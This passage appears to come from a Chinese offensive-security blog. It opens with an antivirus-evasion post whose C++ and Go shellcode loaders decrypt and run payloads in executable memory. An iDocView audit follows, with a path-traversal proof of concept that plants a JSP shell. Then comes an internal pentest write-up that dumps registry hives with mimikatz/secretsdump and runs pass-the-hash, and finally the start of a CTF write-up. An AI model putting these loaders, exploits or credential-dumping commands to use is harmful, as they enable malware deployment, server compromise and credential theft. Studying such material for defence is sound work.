href=\"https://killer.wtf/2022/01/19/CustomJmpUnhook.html\">自定义跳转函数的unhook方法</a></p>\n<p><a href=\"https://blog.csdn.net/xf555er/article/details/132439629\">Hook免杀实战: 去除杀软的三环钩子_unhook 免杀</a></p>\n<p><a href=\"https://xz.aliyun.com/t/9493?time__1311=n4+xuDgD9ALxBGDlxGrbDyiDclDnjhZlDYT+D\">bypass Bitdefender</a></p>\n<p><a href=\"https://shells.systems/defeat-bitdefender-total-security-using-windows-api-unhooking-to-perform-process-injection/\">Defeat Bitdefender total security using windows API unhooking to perform process injection - Shells.Systems</a></p>\n<p>项目：</p>\n<p><a href=\"https://github.com/fdx-xdf/LdrLoadDll-Unhooking-x86-x64/blob/main/unhook.cpp\">LdrLoadDll-Unhooking-x86-x64/unhook.cpp at main · fdx-xdf/LdrLoadDll-Unhooking-x86-x64</a></p>\n<p><a href=\"https://github.com/dosxuz/PerunsFart\">PerunsFart: This is my own implementation of the Perun’s Fart technique by Sektor7</a></p>\n<p><a href=\"https://github.com/optiv/Freeze\">/Freeze: Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods</a></p>\n<h1 id=\"SYSCALL\"><a href=\"#SYSCALL\" class=\"headerlink\" title=\"SYSCALL\"></a>SYSCALL</h1><p>简单来说就是跳过api函数调用，直接通过SSN号，利用syscall，直接在内核操作，避免使用API函数。具体原理细节讲不懂。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240516214827068.png\" alt=\"image-20240516214827068\"></p>\n<p>总结：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">首先，为了防止 api 被 hook，提出了 syscall 函数，这产生了地狱之门的项目，然而，当 ntdll 被 hook 时，这种方法就失效了，因此出现了更高级的技术，如“光环之门”，试图通过邻居来获取系统调用号（SSN）。然而，即使获取了 SSN，仍然有可能被安全软件检测到，因为系统调用的签名（sysall）可能会被查杀。为了解决这个问题，出现了“egg_hunter”等技术。但是堆栈的问题还没有解决，我们需要合法的堆栈， SysWhispers2 和 SysWhispers3，它们提出了间接系统调用的方案，进一步提高了对系统调用的隐藏性和逃避性，使得安全工具更难检测到和拦截这些调用</span><br></pre></td></tr></table></figure>\n\n<p>Ref：</p>\n<p><a href=\"http://www.qfrost.com/posts/windowskernel/windows%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_2/\">Windows系统调用学习笔记（2）3环进0环</a></p>\n<p><a href=\"https://idiotc4t.com/defense-evasion/overwrite-winapi-bypassav\">通过重写ring3 API函数实现免杀</a></p>\n<p><a href=\"https://www.cnblogs.com/fdxsec/p/18029158\">Syscall笔记 - fdx_xdf</a></p>\n<p><a href=\"https://ryze-t.com/2021/12/01/%E6%B5%85%E8%B0%88-Syscall/\">浅谈 Windows Syscall</a></p>\n<p><a href=\"https://www.cnblogs.com/zpchcbd/p/15961380.html\">API函数的调用过程(三环到零环)以及重写WriteProcessMemory三环</a></p>\n<p><a href=\"https://bbs.kanxue.com/thread-279538.htm\">SysWhispers3学习</a></p>\n<p>项目：</p>\n<p><a href=\"https://github.com/klezVirus/SysWhispers3\">SysWhispers3: SysWhispers on Steroids - AV/EDR evasion via direct system calls</a></p>\n<h1 id=\"白加黑\"><a href=\"#白加黑\" class=\"headerlink\" title=\"白加黑\"></a>白加黑</h1><p>之前写过一篇关于dll劫持的白加黑：<a href=\"http://www.y0ng.top/2023/12/25/DLL%E5%8A%AB%E6%8C%81/\">初探DLL劫持</a>，再推个项目吧：</p>\n<p><a href=\"https://github.com/Neo-Maoku/SearchAvailableExe\">SearchAvailableExe: 寻找可利用的白文件</a></p>\n<p><a href=\"https://github.com/Neo-Maoku/DllMainHijacking\">https://github.com/Neo-Maoku/DllMainHijacking</a></p>\n<p>报错的话转发处理下就行了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void runShellcode() &#123;</span><br><span class=\"line\">    string data &#x3D; &quot;37bcc518419......&quot;;  &#x2F;&#x2F; rc4加密</span><br><span class=\"line\"></span><br><span class=\"line\">    const size_t length &#x3D; data.size() &#x2F; 2;</span><br><span class=\"line\">    unsigned char* buf &#x3D; (unsigned char*)malloc(length);</span><br><span class=\"line\">    &#x2F;&#x2F; 调用函数将十六进制字符串转换为字节型数组</span><br><span class=\"line\">    ToBytes(data, buf, length);</span><br><span class=\"line\">    unsigned char key[] &#x3D; &quot;key is here&quot;;</span><br><span class=\"line\">    enc_dec(key, buf);</span><br><span class=\"line\">    LPVOID shellcode &#x3D; VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, 0x40);</span><br><span class=\"line\"></span><br><span class=\"line\">    memcpy(shellcode, buf, length);</span><br><span class=\"line\"></span><br><span class=\"line\">    void(*func)();</span><br><span class=\"line\">    func &#x3D; (void(*)())shellcode;</span><br><span class=\"line\">    func();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240517122818922.png\" alt=\"image-20240517122818922\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240517143734080.png\" alt=\"image-20240517143734080\"></p>\n<p>Ref：<a href=\"https://saucer-man.com/information_security/1171.html\">https://saucer-man.com/information_security/1171.html</a></p>\n<h1 id=\"堆栈溢出\"><a href=\"#堆栈溢出\" class=\"headerlink\" title=\"堆栈溢出\"></a>堆栈溢出</h1><p><a href=\"https://xz.aliyun.com/t/14405?time__1311=mqmx9QD=0=0Q5GNDQiiQL3AKgRD0O7BRiD&alichlgref=https://xz.aliyun.com/u/83539#toc-0\">无Windows API的新型恶意程序：自缺陷程序利用堆栈溢出的隐匿稳定攻击技术研究</a></p>\n<p>是个思路，但是有dll的话不如用白加黑。</p>\n<h1 id=\"临时免杀\"><a href=\"#临时免杀\" class=\"headerlink\" title=\"临时免杀\"></a>临时免杀</h1><h2 id=\"golang-syscall\"><a href=\"#golang-syscall\" class=\"headerlink\" title=\"golang syscall\"></a>golang syscall</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">\t&quot;syscall&quot;</span><br><span class=\"line\">\t&quot;unsafe&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; shellcode is here</span><br><span class=\"line\">\tdata :&#x3D; []byte&#123;0x56, 0xe2,......&#125;</span><br><span class=\"line\">\tkey :&#x3D; byte(0xAA)</span><br><span class=\"line\"></span><br><span class=\"line\">\t &#x2F;&#x2F; 解密shellcode</span><br><span class=\"line\">\tfor i :&#x3D; 0; i &lt; len(data); i++ &#123;</span><br><span class=\"line\">\t\tdata[i] ^&#x3D; key</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F; 加载动态链接库</span><br><span class=\"line\">\tkernel32, err :&#x3D; syscall.LoadLibrary(&quot;kernel32.dll&quot;)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tdefer syscall.FreeLibrary(kernel32)</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取 VirtualAlloc 函数地址</span><br><span class=\"line\">\tvirtualAlloc, err :&#x3D; syscall.GetProcAddress(kernel32, &quot;VirtualAlloc&quot;)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取 RtlMoveMemory 函数地址</span><br><span class=\"line\">\tntdll, err :&#x3D; syscall.LoadLibrary(&quot;ntdll.dll&quot;)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tdefer syscall.FreeLibrary(ntdll)</span><br><span class=\"line\"></span><br><span class=\"line\">\trtlMoveMemory, err :&#x3D; syscall.GetProcAddress(ntdll, &quot;RtlMoveMemory&quot;)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 调用 VirtualAlloc 分配内存</span><br><span class=\"line\">\tmem, _, err :&#x3D; syscall.Syscall6(uintptr(virtualAlloc), 4,</span><br><span class=\"line\">\t\t0,               &#x2F;&#x2F; lpAddress (0 for system to determine)</span><br><span class=\"line\">\t\tuintptr(4096),   &#x2F;&#x2F; dwSize (size of allocation)</span><br><span class=\"line\">\t\tuintptr(0x1000), &#x2F;&#x2F; flAllocationType (commit reserved pages)</span><br><span class=\"line\">\t\tuintptr(0x40),   &#x2F;&#x2F; flProtect (PAGE_EXECUTE_READWRITE)</span><br><span class=\"line\">\t\t0, 0)</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 执行shellcode</span><br><span class=\"line\">\t_, _, err &#x3D; syscall.Syscall6(uintptr(rtlMoveMemory), 3,</span><br><span class=\"line\">\t\tmem,                               &#x2F;&#x2F; Destination</span><br><span class=\"line\">\t\tuintptr(unsafe.Pointer(&amp;data[0])), &#x2F;&#x2F; Source</span><br><span class=\"line\">\t\tuintptr(len(data)),                &#x2F;&#x2F; Length</span><br><span class=\"line\">\t\t0, 0, 0)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tsyscall.Syscall(mem, 0, 0, 0, 0)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>enc.go</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">\t&quot;encoding&#x2F;hex&quot;</span><br><span class=\"line\">\t&quot;fmt&quot;</span><br><span class=\"line\">\t&quot;strings&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; 要加密的数据</span><br><span class=\"line\">\tdataHex :&#x3D; &#96;shellcode is here&#96;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdataHex &#x3D; strings.ReplaceAll(dataHex, &quot;\\t&quot;, &quot;&quot;)</span><br><span class=\"line\">\tdataHex &#x3D; strings.ReplaceAll(dataHex, &quot;\\n&quot;, &quot;&quot;)</span><br><span class=\"line\">\tdataHex &#x3D; strings.ReplaceAll(dataHex, &quot;\\\\x&quot;, &quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 解析十六进制字符串为字节切片</span><br><span class=\"line\">\tdata, err :&#x3D; hex.DecodeString(dataHex)</span><br><span class=\"line\">\tif err !&#x3D; nil &#123;</span><br><span class=\"line\">\t\tfmt.Println(&quot;解析十六进制字符串失败:&quot;, err)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 加密密钥</span><br><span class=\"line\">\tkey :&#x3D; byte(0xAA)</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 加密数据</span><br><span class=\"line\">\tfor i :&#x3D; 0; i &lt; len(data); i++ &#123;</span><br><span class=\"line\">\t\tdata[i] ^&#x3D; key</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 将加密后的内容按 \\x 格式输出</span><br><span class=\"line\">\tencryptedString :&#x3D; &quot;&quot;</span><br><span class=\"line\">\tfor _, b :&#x3D; range data &#123;</span><br><span class=\"line\">\t\tencryptedString +&#x3D; fmt.Sprintf(&quot;\\\\x%02x&quot;, b)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfmt.Println(&quot;加密后的内容：&quot;, encryptedString)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>编译：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">go build -ldflags &quot;-H windowsgui&quot; main.go</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"c-rc4\"><a href=\"#c-rc4\" class=\"headerlink\" title=\"c++ rc4\"></a>c++ rc4</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\">#include &lt;fstream&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &quot;lazy_importer.hpp&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">#define size_b 256</span><br><span class=\"line\">unsigned char sbox[257] &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;初始化s表</span><br><span class=\"line\">void init_sbox(unsigned char* key) &#123;</span><br><span class=\"line\">    unsigned int i, j, k;</span><br><span class=\"line\">    int tmp;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class=\"line\">        sbox[i] &#x3D; i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    j &#x3D; k &#x3D; 0;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class=\"line\">        tmp &#x3D; sbox[i];</span><br><span class=\"line\">        j &#x3D; (j + tmp + key[k]) % size_b;</span><br><span class=\"line\">        sbox[i] &#x3D; sbox[j];</span><br><span class=\"line\">        sbox[j] &#x3D; tmp;</span><br><span class=\"line\">        if (++k &gt;&#x3D; strlen((char*)key))k &#x3D; 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;加解密函数</span><br><span class=\"line\">void AES_enc(unsigned char* key, unsigned char* data) &#123;</span><br><span class=\"line\">    int i, j, k, R, tmp;</span><br><span class=\"line\">    init_sbox(key);</span><br><span class=\"line\"></span><br><span class=\"line\">    j &#x3D; k &#x3D; 0;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; strlen((char*)data); i++) &#123;</span><br><span class=\"line\">        j &#x3D; (j + 1) % size_b;</span><br><span class=\"line\">        k &#x3D; (k + sbox[j]) % size_b;</span><br><span class=\"line\"></span><br><span class=\"line\">        tmp &#x3D; sbox[j];</span><br><span class=\"line\">        sbox[j] &#x3D; sbox[k];</span><br><span class=\"line\">        sbox[k] &#x3D; tmp;</span><br><span class=\"line\"></span><br><span class=\"line\">        R &#x3D; sbox[(sbox[j] + sbox[k]) % size_b];</span><br><span class=\"line\"></span><br><span class=\"line\">        data[i] ^&#x3D; R;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char hexCharToByte(char character) &#123;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;0&#39;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;a&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;A&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void ToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class=\"line\">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    string data &#x3D; &quot;93bf58b44d4d8c000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed5241514....&quot;;</span><br><span class=\"line\">    ifstream ifs;</span><br><span class=\"line\">    ifs.open(&quot;sss.txt&quot;, ios::in);</span><br><span class=\"line\">    if (ifs.is_open()) &#123;</span><br><span class=\"line\">        string line;</span><br><span class=\"line\">        getline(ifs, line);</span><br><span class=\"line\">        ifs.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    const size_t length &#x3D; data.size() &#x2F; 2; &#x2F;&#x2F; 字节长度</span><br><span class=\"line\">    </span><br><span class=\"line\">    unsigned char* buffer &#x3D; (unsigned char*)malloc(length);</span><br><span class=\"line\">    &#x2F;&#x2F; 调用函数将十六进制字符串转换为字节型数组</span><br><span class=\"line\">    ToBytes(data, buffer, length);</span><br><span class=\"line\">    unsigned char key[] &#x3D; &quot;baidu.com&quot;;</span><br><span class=\"line\">    AES_enc(key, buffer);</span><br><span class=\"line\">    char* mypng &#x3D; (char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(mypng, buffer, length);</span><br><span class=\"line\">    ((void(*) ())mypng)();</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"杂项\"><a href=\"#杂项\" class=\"headerlink\" title=\"杂项\"></a>杂项</h1><h2 id=\"添加资源\"><a href=\"#添加资源\" class=\"headerlink\" title=\"添加资源\"></a>添加资源</h2><p>绕过QVM</p>\n<p>加资源文件即可</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240507104631466.png\" alt=\"image-20240507104631466\"></p>\n<h2 id=\"vs配置免杀\"><a href=\"#vs配置免杀\" class=\"headerlink\" title=\"vs配置免杀\"></a>vs配置免杀</h2><p>主绕过QVM</p>\n<p><a href=\"https://mp.weixin.qq.com/s/UJlVvagNjmy9E-B-XjBHyw\">https://mp.weixin.qq.com/s/UJlVvagNjmy9E-B-XjBHyw</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181614551.png\" alt=\"image-20240505181614551\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181628246.png\" alt=\"image-20240505181628246\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181642420.png\" alt=\"image-20240505181642420\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181653701.png\" alt=\"image-20240505181653701\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181712675.png\" alt=\"image-20240505181712675\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181809890.png\" alt=\"image-20240505181809890\"></p>\n","categories":["Red-Team"]},{"title":"iDocView","url":"/2024/01/07/idocview/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>练习挖掘1day。漏洞通报：</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=Mzg5MTc3ODY4Mw==&mid=2247503881&idx=1&sn=7fa3f08a5517cfd57b047e42538a8849\">漏洞通告 | I Doc View在线文档预览系统远程代码执行漏洞</a> </p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247500034&idx=1&sn=47dec7449a23732e435d69a07b30249d\">【已复现】I Doc View在线文档预览系统代码执行漏洞(QVD-2023-45061)安全风险通告</a></p>\n<a id=\"more\"></a>\n\n<h1 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h1><p>controller很少，一个一个看很快发现一个问题的控制器</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/OA/seeyon/image-20231122213334587.png\" alt=\"image-20231122213334587\"></p>\n<p>HtmlController.java，提供url参数，然后调用 <code>GrabWebPageUtil.downloadHtml</code> 其中参数 url可控，htmlDir不可控</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/OA/seeyon/image-20231122213507490.png\" alt=\"image-20231122213507490\"></p>\n<p>跟进，<code>GrabWebPageUtil.getWebPage </code>很明显是重点，传入了URL对象，传参情况：(可控，不可控，’index.html’)</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/OA/seeyon/image-20231122213841729.png\"></p>\n<p>仔细分析<code>GrabWebPageUtil.getWebPage</code> 函数，如果第三个参数不可控，那么将来写入的文件名就不可控，所以这里如果为空或可控，就有可能远程获取文件内容后，写入的文件后缀改为.jsp。可惜这里不可控，强制修改filename为index.html。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/OA/seeyon/image-20231122214202929.png\" alt=\"image-20231122214202929\"></p>\n<p>如果filename后缀如图示，通过远程获取文件内容后写入到index.html。其中调用了 <code>GrabUtility.searchForNewFilesToGrab</code> 根据函数名与入参，有没有可能存在比如解析漏洞？所以跟进。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/OA/seeyon/image-20231122214606968.png\" alt=\"image-20231122214606968\"></p>\n<p>如果filename不是上面所示，最后写入的文件名由outFile控制</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/OA/seeyon/image-20231122220308558.png\" alt=\"image-20231122220308558\"></p>\n<p>outFile完全可控，这里就可以利用目录穿越，拼接后就能将shell文件写入到web目录</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/OA/seeyon/image-20231122220427293.png\" alt=\"image-20231122220427293\"></p>\n<p><code>GrabUtility.searchForNewFilesToGrab</code> 按照html进行解析，提取其中的元素属性，这里有link[href] 、script[src]、img[src]，这里面提取的一定也是某个url或者资源地址，所以接着看 <code>addLinkToFrontier</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/OA/seeyon/image-20231122214906572.png\" alt=\"image-20231122214906572\"></p>\n<p>看代码这里引入了一个重要变量filesToGrab，是个数组，简单来说把src,href中的url放到数组中。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/OA/seeyon/image-20231122215222060.png\" alt=\"image-20231122215222060\"></p>\n<p>然后就是返回返回返回到 <code>GrabWebPageUtil.downloadHtml</code> ，在遍历时，再次调用getWebPage去获取文件，而且这次第三个参数为空，文件后缀完全可控了。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/OA/seeyon/image-20231122215717245.png\" alt=\"image-20231122215717245\"></p>\n<h1 id=\"poc构造\"><a href=\"#poc构造\" class=\"headerlink\" title=\"poc构造\"></a>poc构造</h1><p>流程：携带恶意link[href]的html -&gt; 远程获取  -&gt; 解析出href -&gt; 远程获取恶意文件</p>\n<p>poc.html</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;test&lt;&#x2F;title&gt;  </span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  &lt;link href&#x3D;&quot;&#x2F;..\\..\\..\\docview\\poc.jsp&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>然后构造 <code>..\\..\\..\\docview\\poc.jsp</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/OA/seeyon/image-20231122222533013.png\" alt=\"image-20231122222533013\"></p>\n<p>OK</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/OA/seeyon/image-20231122222555175.png\" alt=\"image-20231122222555175\"></p>\n","categories":["代码审计"]},{"title":"内网练习案例-1","url":"/2024/08/30/internal-pentest-1/","content":"<p>小结：没有难度，通过入口点搭建http代理，通过抓取reg后本地解密，利用hash注入登录域控</p>\n<a id=\"more\"></a>\n\n<p>通过jboss成功命令执行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/internal-pentest/QQ_1723864738717.png\" alt=\"QQ_1723864738717\"></p>\n<p>但是出网限制为域名，ip无法访问，因为没有对c2配置域名，所以暂时无法上线cs。通过suo5代理进内网</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/internal-pentest/QQ_1723864964413.png\" alt=\"QQ_1723864964413\"></p>\n<p>通过信息收集发现直接为域控</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">net group &quot;domain computers&quot; &#x2F;domain   成员计算机</span><br><span class=\"line\">net group &quot;domain controllers&quot; &#x2F;domain  域控机器</span><br><span class=\"line\">net group &quot;domain admins&quot; &#x2F;domain  域管账号</span><br><span class=\"line\"></span><br><span class=\"line\">当前域：</span><br><span class=\"line\">test.com</span><br></pre></td></tr></table></figure>\n\n<p>通过reg抓取后本地解密</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">reg save hklm\\sam sam.hive</span><br><span class=\"line\">reg save hklm\\system system.hive</span><br><span class=\"line\">reg save hklm\\security security.hive</span><br><span class=\"line\"></span><br><span class=\"line\">mimikatz.exe &quot;lsadump::sam &#x2F;system:system.hive &#x2F;sam:sam.hive&quot; exit</span><br><span class=\"line\">或</span><br><span class=\"line\">python C:\\Users\\Administrator\\Desktop\\pentest\\Intranet\\impacket-0.11.0\\examples\\secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure>\n\n<p>获取域管hash</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/internal-pentest/image-20240817164217619.png\" alt=\"image-20240817164217619\"></p>\n<p>解不开密码，hash注入方式打开adexplorer</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\"></span><br><span class=\"line\">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:test.com &#x2F;ntlm:17b08c61c70abc49f54bba0000000000  &quot;&#x2F;run:C:\\Users\\Administrator\\Desktop\\pentest\\Intranet\\Domain\\ADExplorer64.exe&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/internal-pentest/image-20240817164459189.png\" alt=\"image-20240817164459189\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/internal-pentest/image-20240817164342940.png\" alt=\"image-20240817164342940\"></p>\n","categories":["内网渗透"]},{"title":"HACKTHEBOX-CTF2022","url":"/2023/12/25/hackthebox/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220519192325321.png\" alt=\"image-20220519192325321\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"Before\"><a href=\"#Before\" class=\"headerlink\" title=\"Before\"></a>Before</h1><p>五天的比赛，总共61道赛题，11道web题目，队友依旧给力，pwn,re,misc等都ak了，最后写出了59道题目，位于7014支队伍的第7名。</p>\n<p>目前是周四下午18.30，距离比赛结束还有2h，结束五天沉迷解题的状态，下载附件、代码审计、发现异常、搜索漏洞、构造payload、本地测试， 一个字：爽。不过web这回算是个败笔了，差一题AK，啧啧啧，我太菜了</p>\n<h1 id=\"Kryptos-Support\"><a href=\"#Kryptos-Support\" class=\"headerlink\" title=\"Kryptos Support\"></a>Kryptos Support</h1><ul>\n<li>逻辑漏洞</li>\n<li>XSS</li>\n</ul>\n<blockquote>\n<p>The secret vault used by the Longhir’s planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?</p>\n</blockquote>\n<p>开局一个留言框</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515183913950.png\" alt=\"image-20220515183913950\"></p>\n<p>可以xss到cookie，替换后可以更改密码。抓更改密码的包，发现可以更换uid，更换为1，就可以换掉admin的密码了，然后登录admin</p>\n<p>FLAG：HTB{x55_4nd_id0rs_ar3_fun!!} </p>\n<h1 id=\"BlinkerFluids\"><a 